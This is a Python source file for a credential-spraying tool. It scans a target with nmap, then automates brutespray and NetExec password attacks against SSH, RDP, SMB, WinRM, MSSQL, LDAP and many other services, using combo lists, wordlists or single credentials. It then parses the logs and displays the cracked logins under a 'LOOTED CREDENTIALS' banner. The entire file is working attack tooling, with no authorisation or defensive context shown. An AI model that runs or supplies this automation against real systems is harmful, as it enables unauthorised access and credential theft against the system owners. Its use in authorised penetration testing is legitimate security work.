import argparse
import os
import subprocess
import nmap
from rich.console import Console
from rich.text import Text
from rich.table import Table
from rich import box
from rich.panel import Panel
from rich.align import Align
import re
from pathlib import Path

# fancy wrapper around nxc and brutespray :)
console = Console()
LOG_DIR = "./logs"

def ensure_log_dir():
    os.makedirs(LOG_DIR, exist_ok=True)

def delete_if_exists(filename: str):
    if os.path.exists(filename):
        os.remove(filename)

def banner():
    print("\n\n")
    console.print("[bright_red]   ░██      ░████   ")
    console.print("[red]   ░██     ░██ ░██  ")
    console.print("[green]░████████ ░██ ░████ ")
    console.print("[yellow]   ░██    ░██░██░██ ")
    console.print("[bright_blue]   ░██    ░████ ░██ ")
    console.print("[blue]   ░██     ░██ ░██  ") 
    console.print("[bright_magenta]    ░████   ░████  ")
    print("\n\n")

def execute(cmd, debug: bool = False):
    if isinstance(cmd, str):
        cmd = cmd.split()

    if debug:
        subprocess.run(cmd, check=False)
    else:
        subprocess.run(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False
        )

def split_combo_list(combo_list: str,
                     user_out="combo_users.txt",
                     pass_out="combo_passwords.txt"):
    delete_if_exists(user_out)
    delete_if_exists(pass_out)

    with open(combo_list, "r", encoding="utf-8") as combo_file, \
         open(user_out, "a", encoding="utf-8") as user_file, \
         open(pass_out, "a", encoding="utf-8") as password_file:

        for line in combo_file:
            line = line.rstrip("\n")
            if ":" not in line:
                continue
            user, password = line.split(":", 1)
            user_file.write(user + "\n")
            password_file.write(password + "\n")

def validate_args(parser, args):
    mode = args.mode

    if mode == "combo" and not args.combo_list:
        parser.error("--combo-list is required when -m combo is used")

    if mode == "bruteforce":
        missing = [flag for flag, val in
                   (("--user-file", args.user_file),
                    ("--pass-file", args.pass_file))
                   if not val]
        if missing:
            parser.error(f"{', '.join(missing)} required when using -m bruteforce")

    if mode == "single" and not args.creds:
        parser.error("--creds or -c must be provided in the format username:password")

def build_base_auth_cmd(mode, host,
                        combo_list=None, user_file=None, pass_file=None, creds=None):
    if mode == "combo":
        split_combo_list(combo_list)
        return (
            f"nxc $$PROTO$$ {host} "
            f"-u combo_users.txt -p combo_passwords.txt "
            f"--no-bruteforce --continue-on-success "
            f"--log {LOG_DIR}/nxc_{host}_$$PROTO$$.log"
        )

    if mode == "single":
        username, password = creds.split(":", 1)
        return (
            f"nxc $$PROTO$$ {host} "
            f"-u {username} -p {password} "
            f"--log {LOG_DIR}/nxc_{host}_$$PROTO$$.log"
        )

    # bruteforce
    return (
        f"nxc $$PROTO$$ {host} "
        f"-u {user_file} -p {pass_file} "
        f"--log {LOG_DIR}/nxc_{host}_$$PROTO$$.log"
    )

def run_nmap(target: str) -> str:
    nm = nmap.PortScanner()
    output_file = f"{target}.xml"

    nm.scan(hosts=target, arguments="--top-ports 1000 -sV")
    xml_data = nm.get_nmap_last_output()

    if xml_data is None:
        raise RuntimeError("nmap returned no output. Is nmap installed and permitted to run?")

    # xml_data may be bytes OR str depending on python-nmap version
    if isinstance(xml_data, bytes):
        xml_text = xml_data.decode("utf-8", errors="replace")
    else:
        xml_text = str(xml_data)

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(xml_text)

    return output_file

def brutespray(mode, nmap_scan,
               combo_list=None, user_file=None, pass_file=None, creds=None):
    base_cmd = (
        f"brutespray -f {nmap_scan} "
        f"-s ssh,ftp,smtp,telnet,postgres,imap,pop3,snmp,mysql,"
        f"vmauthd,asterisk,vnc,mongodb,nntp,oracle,teamspeak,xmpp,rdp "
        f"-o {LOG_DIR} "
    )

    if mode == "combo":
        cmd = base_cmd + f"-C {combo_list}"
    elif mode == "single":
        username, password = creds.split(":", 1)
        cmd = base_cmd + f"-u {username} -p {password}"
    else:  # bruteforce
        cmd = base_cmd + f"-u {user_file} -p {pass_file}"

    execute(cmd)

def nxc(nmap_xml, mode,
        combo_list=None, user_file=None, pass_file=None, creds=None):
    nm = nmap.PortScanner()

    with open(nmap_xml, "r", encoding="utf-8") as f:
        nm.analyse_nmap_xml_scan(f.read())

    cmd_list = []
    for host in nm.all_hosts():
        if "tcp" not in nm[host]:
            continue

        base_cmd = build_base_auth_cmd(
            mode, host,
            combo_list=combo_list,
            user_file=user_file,
            pass_file=pass_file,
            creds=creds
        )

        for port, info in nm[host]["tcp"].items():
            if info.get("state") != "open":
                continue

            if port == 445:
                cmd_list.append(base_cmd.replace("$$PROTO$$", "smb"))
            elif port == 1433:
                cmd_list.append(base_cmd.replace("$$PROTO$$", "mssql"))
            elif port in (5985, 5986):
                cmd_list.append(base_cmd.replace("$$PROTO$$", "winrm"))
            elif port in (389, 636):
                cmd_list.append(base_cmd.replace("$$PROTO$$", "ldap"))
            elif port == 2049:
                cmd_list.append(base_cmd.replace("$$PROTO$$", "nfs"))

    for command in sorted(set(cmd_list)):
        execute(command)

def render_table(creds):
    title = Text("LOOTED CREDENTIALS", style="bold bright_green")
    subtitle = Text(f"{len(creds)} unique entries", style="dim cyan")

    table = Table(
        title=title,
        caption=subtitle,
        box=box.DOUBLE_EDGE,
        border_style="bright_green",
        header_style="bold bright_green",
        show_lines=False,
        row_styles=["none", "dim"],
        pad_edge=False,
    )

    table.add_column("SERVICE", style="bright_cyan", no_wrap=True)
    table.add_column("IP", style="bright_magenta", no_wrap=True)
    table.add_column("USERNAME", style="white")
    table.add_column("PASSWORD", style="bold yellow")

    for c in creds:
        service = str(c.get("service", "")).lower()
        ip = str(c.get("ip", ""))
        user = str(c.get("username", ""))
        pw = str(c.get("password", ""))

        svc_style = {
            "ssh": "bright_cyan",
            "winrm": "bright_magenta",
            "rdp": "bright_red",
            "smb": "bright_green",
            "mssql": "yellow",
        }.get(service, "cyan")

        table.add_row(
            Text(service.upper(), style=f"bold {svc_style}"),
            Text(ip, style="bright_magenta"),
            Text(user, style="white"),
            Text(pw, style="bold yellow"),
        )

    panel = Panel(
        Align.center(table),
        border_style="green",
        padding=(1, 2),
        title="ACCESS GRANTED",
        title_align="left",
        subtitle="stay frosty",
        subtitle_align="right",
    )

    console.print(panel)

def extract_creds(LOG_DIR):
    BRUTESPRAY_RE = re.compile(
    r"Attempt\s+(?P<service>[A-Za-z0-9._-]+).*?"
    r"host\s+(?P<ip>\d{1,3}(?:\.\d{1,3}){3}).*?"
    r"username\s+(?P<username>\S+)\s+and\s+password\s+(?P<password>\S+)",
    re.IGNORECASE,
    )
    
    NXC_RE = re.compile(
    r"-\s*INFO\s*-\s*(?P<service>[A-Za-z0-9._-]+)\s+"
    r"(?P<ip>\d{1,3}(?:\.\d{1,3}){3}).*?"
    r"\[\+\]\s*(?P<username>[^:\s]+):(?P<password>\S+)",
    re.IGNORECASE,
    )
    
    creds = []
    seen = set()
    for file in Path(LOG_DIR).glob("*"):
        if file.is_dir():
            continue

        for line in file.read_text(errors="replace").splitlines():
            line = line.strip()
            if not line:
                continue
            PATTERNS = (BRUTESPRAY_RE, NXC_RE)
            for rx in PATTERNS:
                for m in rx.finditer(line):  # <-- grab *all* matches for this pattern
                    d = m.groupdict()
                    item = {
                        "service": d["service"].lower(),
                        "ip": d["ip"],
                        "username": d["username"],
                        "password": d["password"],
                    }

                    key = (item["service"], item["ip"], item["username"], item["password"])
                    if key not in seen:
                        seen.add(key)
                        creds.append(item)
    
    return creds



def main():
    banner()
    ensure_log_dir()

    parser = argparse.ArgumentParser(description="spray n pray.")
    parser.add_argument("target", help="targets to scan")
    parser.add_argument(
        "-m", "--mode",
        choices=["combo", "bruteforce", "single"],
        required=True,
        help="Mode to run in: combo, bruteforce, or single"
    )
    parser.add_argument("--combo-list", dest="combo_list",
                        help="(combo mode only) username:password per line")
    parser.add_argument("--user-file", dest="user_file",
                        help="(bruteforce mode only) usernames file")
    parser.add_argument("--pass-file", dest="pass_file",
                        help="(bruteforce mode only) passwords file")
    parser.add_argument("-c", "--creds", dest="creds",
                        help="(single mode only) username:password")

    args = parser.parse_args()
    validate_args(parser, args)

    target = args.target
    mode = args.mode

    with console.status(f"[bold green]scanning {target}[/]") as status:
        status.update(f"discovering services on {target}...")
        nmap_file = run_nmap(target)

        status.update(f"running brutespray in {mode} mode...")
        brutespray(
            mode, nmap_file,
            combo_list=args.combo_list,
            user_file=args.user_file,
            pass_file=args.pass_file,
            creds=args.creds
        )

        status.update(f"running nxc on additional services in {mode} mode...")
        nxc(
            nmap_file, mode,
            combo_list=args.combo_list,
            user_file=args.user_file,
            pass_file=args.pass_file,
            creds=args.creds
        )
        status.update(f"parsing logs...")
        creds = extract_creds(LOG_DIR)
        render_table(creds)
    

if __name__ == "__main__":
    main()

